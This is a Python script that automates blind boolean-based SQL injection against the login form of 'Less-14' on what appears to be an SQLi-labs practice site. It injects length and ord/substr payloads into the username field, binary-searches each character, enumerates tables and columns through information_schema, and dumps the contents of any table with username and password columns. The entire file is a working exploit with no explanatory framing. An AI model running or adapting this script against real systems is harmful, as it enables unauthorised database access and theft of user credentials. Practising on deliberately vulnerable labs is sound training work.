import requests


get_table = "(select group_concat(table_name) from information_schema.tables where table_schema= database())"
get_column = "(select group_concat(column_name) from information_schema.columns where table_name = '{0}')"
get_secret = "(select group_concat({0}) from {1} )"
url = "https://sqlilabs.carelessfinch.me/Less-14/"
session = requests.Session()
def getsize(find):
    leng=0
    payload = '" or (length({0})={1})#'
    for i in range(400):
        response = requests.post(url,data={'uname':payload.format(find,i),'passwd':''})
        if ('<img src="../images/flag.jpg" />' in response.text):
            leng = i
            break
    return leng

def getname(leng,find):
     payload = '" or (ord(substr({0},{1},1))>={2})#'
     name=""
     number_of_request = 0
     for i in range(1,leng):
         mini=0
         maxi=128
         while(maxi>mini):
             mid=int((maxi+mini)/2)
             response = requests.post(url,data={'uname':payload.format(find,i,mid),'passwd':""})
             number_of_request += 1
             if ('<img src="../images/flag.jpg" />' in response.text ):
                 if(maxi-mini>1):
                     mini=mid
                 else:
                     maxi=mini
             else:
                maxi=mid
         name += chr(mid)
     return name
length = getsize(get_table)+1
table_name = getname(length,get_table)
print ("Tables : ",table_name)
table_name=table_name.split(',')
print()
for i in table_name:
    print("Columns in table -",i)
    length = getsize(get_column.format(i))+1
    column_name = getname(length,get_column.format(i))
    print ("Columns : ",column_name)
    column_name=column_name.split(',')
    if('username' in column_name and 'password' in column_name):
        for j in column_name:
            print("Conents in column -",j)
            length = getsize(get_secret.format(j,i))+1
            content = getname(length,get_secret.format(j,i))
            print("Contents : ",content)
    else:
        print("Not Usefull")
    print()